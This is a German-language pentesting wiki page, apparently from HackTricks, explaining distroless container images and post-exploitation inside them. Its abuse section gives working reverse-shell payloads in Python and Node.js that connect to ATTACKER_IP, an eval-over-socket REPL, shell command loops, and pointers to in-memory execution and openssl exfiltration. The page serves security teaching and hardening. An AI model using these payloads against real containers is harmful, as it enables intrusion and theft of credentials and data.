# Distroless-Container

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Ein **distroless**-Container-Image enthält die **minimalen Runtime-Komponenten, die zum Ausführen einer bestimmten Anwendung erforderlich sind**, und entfernt gezielt die üblichen Distributionstools wie Paketmanager, Shells und große Sammlungen allgemeiner Userland-Dienstprogramme. In der Praxis enthalten distroless-Images oft nur die Anwendungsbinärdatei oder Runtime, ihre Shared Libraries, Zertifikatsbündel und ein sehr kleines Dateisystemlayout. <sup>[[1]](#references)</sup>

Distroless ist kein neues Kernel-Isolationsprimitiv. Distroless ist eine **Image-Designstrategie**. Sie verändert, was **im** Container-Dateisystem verfügbar ist, nicht die Art und Weise, wie der Kernel den Container isoliert. Diese Unterscheidung ist wichtig, denn distroless härtet die Umgebung vor allem dadurch, dass Angreifer nach dem Erlangen der Codeausführung weniger Möglichkeiten haben. Es ersetzt keine Namespaces, seccomp, Capabilities, AppArmor, SELinux oder andere Runtime-Isolationsmechanismen.

## Warum es Distroless gibt

Distroless-Images werden hauptsächlich eingesetzt, um Folgendes zu reduzieren:

- die Image-Größe
- die operative Komplexität des Images
- die Anzahl der Pakete und Binärdateien, die Schwachstellen enthalten könnten
- die Anzahl der Post-Exploitation-Tools, die einem Angreifer standardmäßig zur Verfügung stehen

Deshalb sind distroless-Images bei produktiven Anwendungsbereitstellungen beliebt. Ein Container ohne Shell, Paketmanager und nahezu ohne allgemeine Tools lässt sich im Betrieb meist leichter überblicken und nach einer Kompromittierung schwerer interaktiv missbrauchen.

Beispiele bekannter distroless-Image-Familien sind:

- Googles distroless-Images <sup>[[1]](#references)</sup>
- gehärtete/minimale Images von Chainguard <sup>[[2]](#references)</sup>

## Was Distroless nicht bedeutet

Ein distroless-Container ist **nicht**:

- automatisch rootless
- automatisch nicht privilegiert
- automatisch schreibgeschützt
- automatisch durch seccomp, AppArmor oder SELinux geschützt
- automatisch vor einem Container Escape geschützt

Ein distroless-Image kann weiterhin mit `--privileged`, gemeinsam genutzten Host-Namespaces, gefährlichen Bind Mounts oder einem eingebundenen Runtime-Socket ausgeführt werden. In diesem Fall ist das Image zwar minimal, der Container kann aber trotzdem katastrophal unsicher sein. Distroless verändert die **Angriffsfläche des Userlands**, nicht die **Kernel-Vertrauensgrenze**.

## Typische operative Merkmale

Wenn du einen distroless-Container kompromittierst, fällt dir meist zuerst auf, dass gängige Annahmen nicht mehr zutreffen. Möglicherweise gibt es kein `sh`, kein `bash`, kein `ls`, kein `id`, kein `cat` und manchmal nicht einmal eine libc-basierte Umgebung, die sich so verhält, wie du es von deinen üblichen Methoden erwartest. Das wirkt sich sowohl auf offensive als auch auf defensive Maßnahmen aus, denn fehlende Tools verändern Debugging, Incident Response und Post-Exploitation.

Die häufigsten Muster sind:

- Die Anwendungs-Runtime ist vorhanden, aber sonst kaum etwas.
- Shell-basierte Payloads schlagen fehl, weil keine Shell vorhanden ist.
- Gängige Enumeration-One-Liner schlagen fehl, weil die Hilfsprogramme fehlen.
- Oft sind auch Dateisystemschutzmaßnahmen wie ein schreibgeschütztes Root-Dateisystem oder `noexec` auf beschreibbaren tmpfs-Volumes vorhanden.

Diese Kombination führt meist dazu, dass von „Weaponizing Distroless“ die Rede ist.

## Distroless und Post-Exploitation

Die größte offensive Herausforderung in einer distroless-Umgebung ist nicht immer der anfängliche RCE. Oft kommt es darauf an, was danach passiert. Wenn der kompromittierte Workload Codeausführung in einer Sprach-Runtime wie Python, Node.js, Java oder Go ermöglicht, kannst du möglicherweise beliebige Logik ausführen, aber nicht mit den üblichen shell-zentrierten Workflows, die auf anderen Linux-Zielen verbreitet sind.

Das bedeutet, dass sich die Post-Exploitation oft in eine von drei Richtungen verlagert:

1. **Die vorhandene Sprach-Runtime direkt verwenden**, um die Umgebung zu enumerieren, Sockets zu öffnen, Dateien zu lesen oder zusätzliche Payloads bereitzustellen.
2. **Eigene Tools in den Speicher laden**, wenn das Dateisystem schreibgeschützt ist oder beschreibbare Pfade mit `noexec` eingebunden sind.
3. **Vorhandene Binärdateien im Image missbrauchen**, falls die Anwendung oder ihre Abhängigkeiten etwas unerwartet Nützliches enthalten.

## Missbrauch

### Die bereits vorhandene Runtime enumerieren

In vielen distroless-Containern gibt es keine Shell, aber weiterhin eine Anwendungs-Runtime. Wenn das Ziel ein Python-Dienst ist, ist Python vorhanden. Wenn das Ziel Node.js ist, ist Node vorhanden. Das bietet oft genug Funktionalität, um Dateien zu enumerieren, Umgebungsvariablen auszulesen, Reverse Shells zu öffnen und Code im Speicher auszuführen, ohne jemals `/bin/sh` aufzurufen.

Ein einfaches Beispiel mit Python:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Ein einfaches Beispiel mit Node.js:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Auswirkung:

- Wiederherstellung von Umgebungsvariablen, die häufig Zugangsdaten oder Service-Endpunkte enthalten
- Auflisten des Dateisystems ohne `/bin/ls`
- Ermitteln beschreibbarer Pfade und eingebundener Secrets

### Interaktive Laufzeitumgebung ohne `/bin/sh`

Wenn das Image weder `sh` noch `bash` enthält, schlägt eine klassische shell-basierte Reverse Shell fehl. In diesem Fall lässt sich stattdessen eine interaktive Sitzung in der installierten Sprachlaufzeit bereitstellen, anstatt eine nicht vorhandene Shell zu starten.

Zum Beispiel leitet dieser Python-Payload eine interaktive Python-Konsole über einen Socket um:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

Der entsprechende Node.js-Ansatz kann JavaScript auswerten, das über einen Socket empfangen wurde. Es handelt sich um ein JavaScript-REPL, nicht um eine Betriebssystem-Shell; Datei-, Prozess- und Netzwerkoperationen müssen über die APIs von Node ausgeführt werden:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Beide Beispiele erfordern ausgehende Netzwerkverbindungen und einen verfügbaren Interpreter und bieten nur die Funktionalität, die dieser Interpreter bereitstellt.

Falls das Image unerwarteterweise `/bin/sh` enthält, sind die klassischen interpretergestützten Shell-Payloads weiterhin nützlich. Sie werden separat gezeigt, da sie nicht wirklich shell-frei sind:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

Das ältere Python-Befehls-Schleifenmuster ist auch dann nützlich, wenn `/bin/sh` vorhanden ist, ein interaktives PTY jedoch unpraktisch ist. Es wird hier beibehalten, wobei die tatsächliche Abhängigkeit ausdrücklich genannt wird: `subprocess.run(..., shell=True)` ruft die System-Shell auf und ist daher **keine no-shell-Technik**.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Vollständiges Beispiel: Python-Befehlsschleife ohne Shell

Wenn das Image Python, aber überhaupt keine Shell enthält, kann eine lokale Python-REPL dennoch die Untersuchung des Dateisystems, der Umgebung und des Netzwerks ermöglichen:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Diese Schleife ruft `/bin/sh` nicht auf. Sie wertet Python-Ausdrücke und -Anweisungen direkt aus, daher müssen Operationen Python-APIs statt Shell-Befehle verwenden. Trotz dieser Einschränkung kann sie einen Großteil der Möglichkeiten einer einfachen Shell bieten: Dateisystem- und Umgebungsvariablen-Aufzählung, Datenzugriff, Netzwerkaktivität und das Bereitstellen weiterer Payloads über die installierte Laufzeitumgebung.

### Tool-Ausführung im Arbeitsspeicher

Distroless-Images werden oft kombiniert mit:

- `readOnlyRootFilesystem: true`
- beschreibbarem, aber `noexec`-tmpfs wie `/dev/shm`
- fehlenden Paketverwaltungstools

Diese Kombination macht klassische Workflows nach dem Muster „Binary herunterladen und von der Festplatte ausführen“ unzuverlässig. In solchen Fällen werden Techniken zur Ausführung im Arbeitsspeicher zur wichtigsten Alternative.

Die entsprechende Seite dazu ist:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Die dort relevantesten Techniken sind:

- `memfd_create` + `execve` über Skriptlaufzeitumgebungen <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Bei einem Python-, Node.js- oder PHP-Dienst kann ein Anwendungsfehler wie Template Injection, Prototype Pollution oder unsichere Auswertung als Einstiegspunkt dienen. Führt dieser zur Codeausführung innerhalb des Prozesses, kann eine `/proc/self/mem`-Technik einen Loader ohne Shell oder ausführbare Datei auf der Festplatte ausführen. Die Ausführung erfolgt weiterhin mit der Identität des Container-Prozesses; für einen Container Escape ist zusätzlich eine Schwachstelle in einer Laufzeitumgebung oder an der Host-Grenze erforderlich. Die Voraussetzungen findest du unter [Techniken für read-only/noexec/distroless](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md).

### Bereits im Image vorhandene Binaries

Einige Distroless-Images enthalten weiterhin betrieblich notwendige Binaries, die nach einer Kompromittierung nützlich werden. Ein wiederholt beobachtetes Beispiel ist `openssl`, da Anwendungen es manchmal für kryptografie- oder TLS-bezogene Aufgaben benötigen.

Ein einfaches Suchmuster ist:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

Wenn `openssl` vorhanden ist, kann es möglicherweise verwendet werden für:

- ausgehende TLS-Verbindungen
- Datenexfiltration über einen zulässigen Egress-Kanal
- das Bereitstellen von Payload-Daten über codierte/verschlüsselte Blobs

Der genaue Missbrauch hängt davon ab, was tatsächlich installiert ist. Die allgemeine Idee ist jedoch, dass distroless nicht „überhaupt keine Tools“ bedeutet, sondern „deutlich weniger Tools als ein normales Distributions-Image“.

## Checks

Mit diesen Checks soll ermittelt werden, ob das Image in der Praxis wirklich distroless ist und welche Runtime- oder Hilfs-Binärdateien noch für Post-Exploitation verfügbar sind.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

Was hier interessant ist:

- Wenn keine Shell vorhanden ist, aber eine Laufzeitumgebung wie Python oder Node, sollte sich post-exploitation auf laufzeitgesteuerte Ausführung verlagern.
- Wenn das Root-Dateisystem schreibgeschützt ist und `/dev/shm` beschreibbar, aber mit `noexec` eingebunden ist, werden Speicher-Ausführungstechniken deutlich relevanter.
- Wenn Hilfsprogramme wie `openssl`, `busybox` oder `java` vorhanden sind, bieten sie möglicherweise genügend Funktionen, um den weiteren Zugriff vorzubereiten.

## Laufzeitstandards

| Image-/Plattformstil | Standardzustand | Typisches Verhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Google-Distroless-Images | Minimaler Userland-Bereich per Design | Keine Shell, kein Paketmanager, nur Anwendungs-/Laufzeitabhängigkeiten | Hinzufügen von Debugging-Layern und Sidecar-Shells sowie Kopieren von busybox oder anderen Tools |
| Chainguard-Minimal-Images | Minimaler Userland-Bereich per Design | Reduzierte Paketoberfläche, oft auf eine Laufzeitumgebung oder einen Dienst ausgerichtet | Verwendung von `:latest-dev` oder Debug-Varianten sowie Kopieren von Tools während des Builds |
| Kubernetes-Workloads mit Distroless-Images | Abhängig von der Pod-Konfiguration | Distroless betrifft nur den Userland-Bereich; die Sicherheit des Pods hängt weiterhin von der Pod-Spezifikation und den Laufzeitstandards ab | Hinzufügen ephemerer Debug-Container, Host-Mounts oder privilegierter Pod-Einstellungen |
| Docker / Podman mit Distroless-Images | Abhängig von den Ausführungsflags | Minimales Dateisystem, aber die Laufzeitsicherheit hängt weiterhin von den Flags und der Daemon-Konfiguration ab | `--privileged`, gemeinsame Host-Namespaces, Laufzeit-Socket-Mounts und beschreibbare Host-Bind-Mounts |

Der entscheidende Punkt ist, dass Distroless eine **Image-Eigenschaft** und kein Laufzeitschutz ist. Der Nutzen besteht darin, nach einer Kompromittierung die im Dateisystem verfügbaren Möglichkeiten zu reduzieren. Multi-Stage-Builds sind eine gängige Methode, um Build-Tools aus dem finalen Image herauszuhalten. <sup>[[3]](#references)</sup>

## Verwandte Seiten

Zu Umgehungen von Dateisystem- und Speicherausführungsschutzmaßnahmen, die in Distroless-Umgebungen häufig benötigt werden:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Zu Missbrauch von Container-Laufzeitumgebungen, Sockets und Mounts, der auch für Distroless-Workloads relevant ist:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools – Distroless-Container-Images](https://github.com/GoogleContainerTools/distroless)
- [2] [Chainguard-Images-Dokumentation](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs – Multi-Stage-Builds](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` – Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
